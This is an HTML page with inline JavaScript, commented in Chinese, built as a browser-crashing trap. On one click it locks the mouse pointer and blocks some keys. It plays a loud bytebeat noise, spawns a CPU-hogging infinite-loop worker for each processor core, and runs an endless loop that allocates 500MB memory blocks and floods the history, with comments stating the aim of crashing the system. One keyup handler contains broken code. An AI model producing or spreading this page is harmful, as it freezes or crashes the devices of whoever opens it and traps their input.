<!DOCTYPE html>
<html>
<head>
    <title>*̸̢͕̳̺̺̰̉̌́̓͆̉̊̍̒</title>
    <style>
        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; }
    </style>
</head>
<body onclick="launch()">
    <script>
        let triggered = false;
        let keysPressed = {};

        // 攔截 M 及 M+G
        window.addEventListener('keydown', (e) => {
            const key = e.key.toUpperCase();
            keysPressed[key] = true;
            if (key === 'M' || (keysPressed['M'] && keysPressed['G'])) e.preventDefault();
        }, true);
        window.addEventListener('keyup', (e) => { delete keysPressed[key] = false; });

        function launch() {
            if (triggered) return;
            triggered = true;

            // 1. 鎖定滑鼠
            document.body.requestPointerLock();

            // 2. Bytebeat
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            if (audioCtx.state === 'suspended') audioCtx.resume();
            const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
            let t = 0;
            scriptNode.onaudioprocess = (e) => {
                const output = e.outputBuffer.getChannelData(0);
                for (let i = 0; i < 4096; i++) {
                    let val = (t >> 8 | t << 6 | t >> 5 | t << 9) & 0xFF;
                    output[i] = (val / 128.0) - 1.0;
                    t++;
                }
            };
            scriptNode.connect(audioCtx.destination);

            // 3. 瞬爆邏輯
            setTimeout(() => {
                const voidData = [];
                
                // (A) 先噴出 8 個背景炸彈
                const blob = new Blob(["while(true){postMessage(Math.random());}"]);
                const url = URL.createObjectURL(blob);
                for(let i=0; i<navigator.hardwareConcurrency; i++) {
                    new Worker(url);
                }

                // (B) 瞬間填滿 RAM 並鎖死 (不再等待 setTimeout)
                // 這就是 JavaScript 版本的 while true do ... end
                while(true) {
                    try {
                        // 每次循環直接塞 500MB，直到系統崩潰
                        voidData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                        
                        // 強制渲染負擔
                        document.title = "CRITICAL_" + Math.random();
                        window.history.pushState({}, '', Math.random());
                    } catch (e) {
                        // 如果 500MB 失敗，用小塊繼續填滿最後的空隙
                        voidData.push(new Uint8Array(10 * 1024 * 1024));
                    }
                }
            }, 50); // 縮短延遲，實現「即點即爆」
        }
    </script>
</body>
</html>
